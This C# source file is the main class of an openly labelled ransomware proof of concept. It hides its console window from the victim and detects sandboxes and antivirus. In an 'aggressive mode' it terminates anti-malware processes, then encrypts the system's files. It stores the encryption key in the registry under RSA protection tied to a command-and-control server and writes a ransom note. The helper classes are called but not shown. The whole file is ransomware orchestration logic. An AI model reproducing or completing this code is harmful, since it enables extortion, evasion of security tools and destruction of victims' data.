using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices; //using winapi 
using System.Diagnostics;


namespace Ilay_sRanomwarePoc
{


    class RansomwareInstance //the final ransomware instance class that uses the utilities in the static classes
    {

        //Console hiding section starts
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr HandlingCode, int CmdCode);
        //console hiding section ends


        //in case of hybrid scheme should be true
        private const bool UsingAsymmetricProtection = true;
        private const bool AggressiveMode = true;
        private const bool ConsoleHiding = true;
        const int WindowHidingCode = ConsoleHiding ? 0 : 5;
        public void RansomwareInstanceExecution()
        {


            //hiding window section==>
            if (ConsoleHiding)    //using winapi kernel32 and user32 dlls in order to hide
                                  //app console from the victim
                                  //using the functions GetConsoleWindow and ShowWindow
            {
                ShowWindow(GetConsoleWindow(), WindowHidingCode);

            }

            Console.WriteLine("checking for  Anti-malware Programs");
            if (!AggressiveMode)
            {
                if (SandboxEscaper.CheckForSandbox())
                {
                    Console.WriteLine("Hello World!"); //note-in stealth mode, in case of a sandbox/av
                                                       //the program will print hello world and exit!
                    Environment.Exit(0);
                }
            }
            while (SandboxEscaper.CheckForSandbox()) //checking if sandboxes are around. 
                                                     //in aggressive mode the program will loop and try to kill all sandbox/av processes,
                                                     //in case of success the program will start the file encryption!
            {
                //Terminating Anti-Malware Programs
                Console.WriteLine("Terminating Anti - Malware Programs");
                AntiMalwareTerminator.TerminateAntiMalwarePrograms();

            }
            //Encrypting the system(path=FileHandlingUtilities.EncryptionDirectory)
            Console.WriteLine("Encrypting the system(path=FileHandlingUtilities.EncryptionDirectory)");
            SystemEncryptor.EncryptSystem();
            //hiding encryption key (depends on AsymmetricProtection boolean)
            //the key will be hidden in the registery, encrypted with an rsa public key.
            //the decryptor will retrive the private key from the c&c server in case of a paid ransom
            //and will iterate all encrypted files while decrypting them and returning the
            //system back to its original state
            Console.WriteLine("hiding encryption key (depends on AsymmetricProtection boolean)");
            if (UsingAsymmetricProtection)
            {
                //encrypts the aes key asymmetricly
                AsymmetricProtection.ProtectAesEncryptionKey();
            }
            else
            {
                //just hiding the aes symmetric key somewhere
                SystemEncryptor.HidEncryptionKey();
            }
            TargetNote.GenerateNote();
            Console.ReadKey();

        }

    }
}
